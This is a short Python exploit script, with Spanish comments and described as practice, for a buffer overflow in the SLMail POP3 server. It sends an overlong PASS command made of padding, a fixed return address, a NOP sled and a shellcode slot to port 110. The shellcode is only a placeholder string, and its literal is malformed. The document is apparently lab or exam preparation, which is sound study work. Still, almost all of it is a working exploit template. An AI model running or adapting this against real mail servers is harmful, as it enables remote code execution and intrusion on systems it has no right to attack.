#!/usr/bin/python
# Bof a Slmail para practicas en python3
# Autor Liandd
from pwn import *
from struct import pack
import socket, sys

def exploit(ip_address, rport):
    # Escapar el shell code con b para indicar que son bytes
    shellcode=(
        b"\ejemplo\"
    )

    buffer = b"A" * 2606 + pack("<L", 0x5f4a358f) + b"\x90"*16 + shellcode
    
    p1 = log.progress("Data")
    try:
        p1.status("Enviando %s bytes" % len(buffer))
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip_address, rport))
        s.recv(1024)
        s.send(b'USER eva\r\n')
        s.recv(1024)
        s.send(b'PASS ' + buffer + b'\r\n')
        s.recv(1024)
    except Exception as e:
        print("\n[!] Ha habido un error de conexión:", e)
        sys.exit(0)

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print ("\n[!] Uso : python " + sys.argv[0] + " <ip-address>\n")
        sys.exit(0)

    ip_address = sys.argv[1]
    rport = 110

    exploit(ip_address, rport)
                              